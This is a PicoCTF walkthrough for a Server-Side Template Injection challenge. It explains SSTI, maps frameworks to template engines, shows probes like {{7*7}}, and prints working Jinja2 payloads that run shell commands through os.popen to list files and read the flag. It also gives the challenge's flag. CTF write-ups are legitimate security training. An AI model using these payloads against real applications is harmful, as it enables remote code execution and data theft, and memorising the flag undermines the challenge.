
# 🧠 SSTI - PicoCTF Walkthrough

### Okay let's get into the point...  
> **What is SSTI?**  

The hint says: it stands for **Server-Side Template Injection**.

After some searching 🕵️‍♀️, I’ve found that:

> **SSTI** → is a vulnerability that happens when user input is **unsafely embedded** into a *template*,  
> and the **template engine evaluates it as code** on the server.  
>  
> This can lead to:
> - 💥 Remote Code Execution (RCE)  
> - 🔍 Data leakage  
> - 🚨 Other serious impacts (depending on the context and language)

---

## 🤔 How to know the template engine or the language?

But first...

### Is a template engine tied to a specific language?

✅ **Yes and No**  
Some languages have **default or popular template engines**, but you're *not strictly limited* to them.  
You *can* switch between engines for the same language — but in reality, most devs **stick to the default or most popular one**.

---

### 📊 Here’s a quick summary table:

| Language | Framework        | Default / Common Template Engine         |
|----------|------------------|------------------------------------------|
| **Python** | Flask          | Jinja2                                   |
|          | Django           | Django Templates (custom syntax)        |
|          | Tornado          | Tornado templates                        |
|          | FastAPI          | Jinja2 (when templates used)             |
| **PHP**   | Laravel         | Blade                                    |
|          | Symfony          | Twig                                     |
|          | CodeIgniter      | PHP itself / custom                      |
| **Java**  | Spring MVC      | Thymeleaf or JSP                         |
|          | Struts           | JSP                                      |
|          | Play Framework   | Scala templates / Twirl                  |
| **Node.js** | Express.js   | EJS, Handlebars, Pug (choice-based)      |
|          | Next.js          | JSX (React)                              |
| **Ruby**  | Ruby on Rails   | ERB                                      |
| **Go**    | net/http        | Go’s native `html/template` or `text/template` |

---

## 🔍 How to detect which template engine to inject?

There are **two main ways**:

---

### 1️⃣ Try common syntax injections:

| Syntax       | Common in             | Example Test     | Output |
|--------------|-----------------------|------------------|--------|
| `{{7*7}}`     | Jinja2, Twig           | → `49`           |
| `${7*7}`      | Velocity, FreeMarker   | → `49`           |
| `<%= 7*7 %>`  | EJS, ERB               | → `49`           |
| `[[ 7*7 ]]`   | AngularJS (client-side)| → `49` (in DOM)  |

---

#### 👇 Example from the challenge:

![image](https://github.com/user-attachments/assets/f6f7d3c6-b154-4578-b4e0-8b7c5bf50ec0)

![image](https://github.com/user-attachments/assets/33c006e0-d3ef-41d4-947d-ae2749a85209)

As you saw above — `{{ 3 * 3 }}` worked → so it's **very likely Jinja2** ✅

---

### 2️⃣ Use headers to guess the backend stack:

```bash
curl -I http://rescued-float.picoctf.net:63948/announce
```

👇 and from the `Server` header you see:

> `Python + Werkzeug` = Flask → Jinja2 🎯

---

## 🚀 Let's inject!

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('ls -R').read() }}
```

![image](https://github.com/user-attachments/assets/3db571c4-a36b-4d6e-9509-f0f19b87886b)

### 🧠 Why this works:

- `config` is often available in Flask/Jinja2 templates  
- `config.__class__` → gets the class of the config dict  
- `.__init__.__globals__` → gives access to the global scope, including the `os` module  
- `['os'].popen('ls -R').read()` → executes the shell command and returns the output

---

### 📁 Directory listing:

```
.
├── __pycache__
│   └── app.cpython-38.pyc
├── app.py
├── flag
└── requirements.txt
```

---

## 🎯 Read the flag!

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```

![image](https://github.com/user-attachments/assets/1d7ab2cf-0a47-4c36-b011-5409c4a2c522)

---

## 🏁 Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```

---

## ✅ I hope this adds to your methodology 🔐  
